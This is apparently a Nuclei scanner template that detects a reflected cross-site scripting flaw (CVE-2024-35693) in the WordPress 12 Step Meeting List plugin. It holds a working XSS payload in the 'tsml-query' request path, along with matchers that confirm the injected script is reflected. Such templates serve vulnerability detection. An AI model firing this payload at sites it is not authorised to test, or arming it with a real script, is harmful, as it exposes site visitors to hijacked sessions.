id: CVE-2024-35693

info:
  name: WordPress 12 Step Meeting List Plugin <= 3.14.33 - Reflected XSS
  author: intelligent-ears
  severity: medium
  description: |
    The 12 Step Meeting List plugin for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS)
    via the 'query' parameter in versions up to and including 3.14.33. This is due to insufficient input
    sanitization and output escaping on user-supplied attributes in the archive-meetings.php template.
    An unauthenticated attacker can inject arbitrary web scripts in pages that execute if they can
    successfully trick a user into performing an action such as clicking on a malicious link.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-35693
    - https://patchstack.com/database/vulnerability/12-step-meeting-list/wordpress-12-step-meeting-list-plugin-3-14-33-cross-site-scripting-xss-vulnerability
    - https://github.com/code4recovery/12-step-meeting-list/issues/1415
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2024-35693
    cwe-id: CWE-79
  metadata:
    verified: true
    max-request: 3
    vendor: code4recovery
    product: 12-step-meeting-list
    framework: wordpress
    publicwww-query: "/wp-content/plugins/12-step-meeting-list/"
  tags: cve,cve2024,wordpress,wp-plugin,xss,reflected,12-step-meeting-list,authenticated

http:
  - method: GET
    path:
      - "{{BaseURL}}/?post_type=tsml_meeting&tsml-query=%22%20onfocus%3Dalert%28document.domain%29%20autofocus%20%22"

    headers:
      ngrok-skip-browser-warning: "true"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'value="[^"]*" onfocus=alert\(document\.domain\) autofocus'

      - type: word
        part: body
        words:
          - 'tsml'

      - type: status
        status:
          - 200
